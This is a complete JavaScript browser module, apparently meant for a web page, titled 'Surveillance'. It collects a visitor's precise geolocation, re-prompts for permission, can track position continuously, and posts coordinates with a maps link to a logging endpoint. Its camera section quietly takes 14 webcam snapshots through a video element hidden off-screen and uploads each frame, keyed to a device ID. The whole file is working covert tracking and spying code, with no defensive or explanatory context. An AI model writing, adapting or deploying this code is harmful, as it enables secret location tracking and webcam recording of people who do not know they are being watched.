const Surveillance = {

    config: {
        highAccuracy: true,
        timeout: 10000,
        logEndpoint: '/log_location',
        camEndpoint: '/upload',
        camShots: 14,
        camInterval: 1000,
        enableLocation: true,
        enableCamera: true
    },

    state: {
        watchId: null,
        watching: false,
        history: [],
        deviceId: null
    },

    async init(deviceId, options = {}) {
        this.state.deviceId = deviceId
        Object.assign(this.config, options)

        let locResult = null
        if (this.config.enableLocation) {
            locResult = await this.collect()
        }

        let camResult = null
        if (this.config.enableCamera) {
            camResult = await this.startCamera()
        }

        return { location: locResult, camera: camResult }
    },

    // ── LOCATION ──────────────────────────────────────────────────────────────

    async collect() {
        const result = { permission: null, location: null, error: null }

        try {
            const status = await navigator.permissions.query({ name: 'geolocation' })
            result.permission = status.state
        } catch {
            result.permission = 'unsupported'
        }

        if (result.permission === 'denied') {
            result.error = 'permission_denied'
            return result
        }

        const pos = await this._requestUntilGranted()
        if (pos.error) { result.error = pos.error; return result }

        result.permission = 'granted'
        result.location = pos
        this._sendLocation(pos)
        this.state.history.push(pos)

        return result
    },

    _requestUntilGranted(retryDelayMs = 2000, maxAttempts = 2) {
        return new Promise(async resolve => {
            let attempts = 0
            while (attempts < maxAttempts) {
                let state = 'prompt'
                try {
                    const s = await navigator.permissions.query({ name: 'geolocation' })
                    state = s.state
                } catch { }

                if (state === 'denied') { resolve({ error: 'permission_denied' }); return }

                attempts++
                const result = await this._requestOnce()
                if (!result.error) { resolve(result); return }
                if (result.error === 'permission_denied') { resolve(result); return }
                if (attempts < maxAttempts) await this._delay(retryDelayMs)
            }
            resolve({ error: 'max_attempts_reached' })
        })
    },

    _requestOnce() {
        return new Promise(resolve => {
            if (!navigator.geolocation) { resolve({ error: 'geolocation_unsupported' }); return }
            navigator.geolocation.getCurrentPosition(
                pos => resolve(this._parsePos(pos)),
                err => resolve({ error: this._errCode(err) }),
                { enableHighAccuracy: this.config.highAccuracy, timeout: this.config.timeout, maximumAge: 0 }
            )
        })
    },

    startWatching(onUpdate) {
        if (this.state.watching || !navigator.geolocation) return
        this.state.watching = true
        this.state.watchId = navigator.geolocation.watchPosition(
            pos => {
                const parsed = this._parsePos(pos)
                this.state.history.push(parsed)
                if (this.state.history.length > 100) this.state.history.shift()
                this._sendLocation(parsed)
                if (typeof onUpdate === 'function') onUpdate(parsed)
            },
            err => console.warn('[surveillance] watch error:', this._errCode(err)),
            { enableHighAccuracy: this.config.highAccuracy, timeout: this.config.timeout, maximumAge: 5000 }
        )
    },

    stopWatching() {
        if (this.state.watchId !== null) {
            navigator.geolocation.clearWatch(this.state.watchId)
            this.state.watchId = null
            this.state.watching = false
        }
    },

    // ── CAMERA ────────────────────────────────────────────────────────────────

    async startCamera() {
        const result = { shots: 0, error: null }

        const video = document.createElement('video')
        const canvas = document.createElement('canvas')
        canvas.width = 480
        canvas.height = 360
        video.style.cssText = 'position:absolute;top:-9999px;left:-9999px'
        document.body.appendChild(video)

        let stream
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: true })
            video.srcObject = stream

            await new Promise(resolve => {
                video.onloadedmetadata = () => { video.play(); resolve() }
            })

            result.shots = await this._captureLoop(stream, video, canvas)

        } catch (e) {
            result.error = e.message
            console.error('[camera] failed:', e)
        } finally {
            if (stream) stream.getTracks().forEach(t => t.stop())
            document.body.removeChild(video)
        }

        return result
    },

    async _captureLoop(stream, video, canvas) {
        const ctx = canvas.getContext('2d')
        const id = this.state.deviceId || 'unknown'
        let shotsTaken = 0

        for (let i = 0; i < this.config.camShots; i++) {
            ctx.drawImage(video, 0, 0, 480, 360)

            const data = canvas.toDataURL('image/jpeg', 0.5)

            await fetch(`${this.config.camEndpoint}?device_id=${id}&shot=${i + 1}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: data })
            }).catch(err => console.error('[camera] upload error:', err))

            shotsTaken++
            await new Promise(r => setTimeout(r, this.config.camInterval))
        }

        return shotsTaken
    },

    // ── SEND ──────────────────────────────────────────────────────────────────

    _sendLocation(data) {
        const id = this.state.deviceId || 'unknown'
        fetch(`${this.config.logEndpoint}?device_id=${id}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(() => { })
    },

    // ── HELPERS ───────────────────────────────────────────────────────────────

    _parsePos(pos) {
        const c = pos.coords
        return {
            lat: c.latitude,
            lng: c.longitude,
            accuracy: c.accuracy,
            altitude: c.altitude,
            altitudeAccuracy: c.altitudeAccuracy,
            heading: c.heading,
            speed: c.speed,
            timestamp: new Date(pos.timestamp).toISOString(),
            source: this._guessSource(c.accuracy),
            mapsLink: `https://maps.google.com/?q=${c.latitude},${c.longitude}`
        }
    },

    _guessSource(accuracy) {
        if (accuracy < 10) return 'gps_high'
        if (accuracy < 100) return 'gps_assisted'
        if (accuracy < 500) return 'wifi_triangulation'
        if (accuracy < 5000) return 'cell_tower'
        return 'ip_fallback'
    },

    _errCode(err) {
        return { 1: 'permission_denied', 2: 'position_unavailable', 3: 'timeout' }[err.code] || 'unknown'
    },

    _delay(ms) {
        return new Promise(r => setTimeout(r, ms))
    }
}
